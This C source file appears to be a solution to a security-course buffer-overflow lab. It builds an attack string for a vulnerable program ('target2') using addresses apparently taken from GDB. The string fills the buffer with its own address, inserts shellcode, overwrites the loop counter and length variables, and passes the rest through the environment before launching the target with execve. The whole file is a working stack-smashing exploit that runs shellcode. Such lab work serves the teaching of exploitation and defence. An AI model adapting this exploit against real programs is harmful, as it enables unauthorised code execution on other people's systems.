#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"

#define NOP 0x090
#define NOPSLIDE 0

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[3];
        
                // Store important addresses gotten from GDB
        int ripAddr = 0x2021fe58;
        int bufAddrStart = 0x2021fd40;
        int iAddr = 0x2021fe48;
        int lenAddr = 0x2021fe4c;
        int overflowSize = ripAddr - bufAddrStart + 5;

	args[0] = TARGET;
	args[1] =  malloc(sizeof(char) * overflowSize);
	args[2] = NULL;
 
        env[0] = NULL;
                // Create attack string
        int *ptr = ( int *) args[1];
        int i; // Have to do this in C99 ffs
        for (i = 0; i < overflowSize; i += 4) {
            // Fill string with address of buffer
            *(ptr++) = (int) bufAddrStart; 
        }
        for (i = 0; i < NOPSLIDE; i++){
            args[1][i] = NOP;
        }
        for (i = NOPSLIDE; i < strlen(shellcode) + NOPSLIDE; ++i) {
            args[1][i] = shellcode[i-NOPSLIDE];
        }
        
        ptr = (int * )&(args[1][iAddr-bufAddrStart]);
        *ptr = (0x11110000 + lenAddr - bufAddrStart - 1);
        
        ptr = (int * )&(args[1][lenAddr-bufAddrStart]);
        *ptr = overflowSize - 1;
        
        args[1][overflowSize - 1] = '\0';
        
        env[0] = "\0";
        env[1] = malloc(overflowSize - (lenAddr + 4 - bufAddrStart));
        memcpy(env[1], &args[1][lenAddr + 4 - bufAddrStart],overflowSize - (lenAddr + 4 - bufAddrStart));
        env[2] = NULL;
        
	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}

